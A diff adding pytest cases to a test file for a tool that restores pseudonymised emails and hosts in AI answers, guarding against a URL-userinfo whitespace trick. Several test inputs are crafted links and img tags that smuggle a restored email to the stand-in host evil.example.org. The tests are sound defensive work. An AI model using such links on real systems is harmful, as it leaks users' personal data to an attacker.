@@ -197,6 +197,40 @@ def test_host_is_after_the_last_at_sign(settings):
     assert own.text == "https://a:b@srv-dc01.contoso.ru:8080/?q=ivanov@contoso.ru"
 
 
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<a href="https://host-1.domain-1.example x@evil.example.org/?q=<EMAIL_1>">',
+        '<a href="https:// @evil.example.org/?q=<EMAIL_1>">',
+        "<img src='//host-1.domain-1.example x@evil.example.org/p?q=<EMAIL_1>'>",
+        "[1]: <https://host-1.domain-1.example x:y@evil.example.org/?q=<EMAIL_1>>",
+    ],
+)
+def test_userinfo_runs_through_whitespace(settings, answer):
+    """Найдено при исправлении ссылок на знаки HTML, P1: пробел в имени пользователя браузер кодирует как «%20» и
+    адрес им не кончает (WHATWG URL, authority state) — «https://наш x@evil…» ведёт на evil."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            '<img srcset="https://host-1.domain-1.example/a.png 1x, https://host-1.domain-1.example/<EMAIL_1>.png 2x">',
+            '<img srcset="https://srv-dc01.contoso.ru/a.png 1x, https://srv-dc01.contoso.ru/ivanov@contoso.ru.png 2x">',
+        ),
+        (
+            '<meta content="0;url=https://host-1.domain-1.example/?to=<EMAIL_1> a@b">',
+            '<meta content="0;url=https://srv-dc01.contoso.ru/?to=ivanov@contoso.ru a@b">',
+        ),
+    ],
+)
+def test_own_link_with_whitespace_and_at_signs_after_the_host_is_restored(settings, answer, restored):
+    """Та же находка с другой стороны: «@» после «/» или «?» — уже не имя пользователя, и наш адрес восстанавливается."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
 def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
     state = link_state()
     own = restore(state, "https://host-1.domain-1.example/?q=<EMAIL_1>", settings)
